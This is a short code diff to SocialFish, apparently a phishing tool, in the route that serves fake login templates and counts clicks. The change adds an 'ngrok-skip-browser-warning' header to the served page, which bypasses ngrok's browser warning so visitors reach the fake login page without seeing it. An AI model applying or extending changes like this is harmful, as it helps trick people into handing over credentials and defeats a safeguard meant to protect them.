@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 #
-from flask import Flask, request, render_template, jsonify, redirect, g, flash
+from flask import Flask, request, render_template, make_response, jsonify, redirect, g, flash
 from core.config import *
 from core.view import head
 from core.scansf import nScan
@@ -145,7 +145,11 @@ def getLogin():
         cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
         g.db.commit()
         template_path = 'fake/{}/{}/index.html'.format(agent, o)
-        return render_template(template_path)
+
+        # set ngrok header
+        resp = make_response(render_template(template_path), 200)
+        resp.headers['ngrok-skip-browser-warning'] = 'true'
+        return resp
     # caso seja a url padrao
     elif url == 'https://github.com/UndeadSec/SocialFish':
         return render_template('default.html')
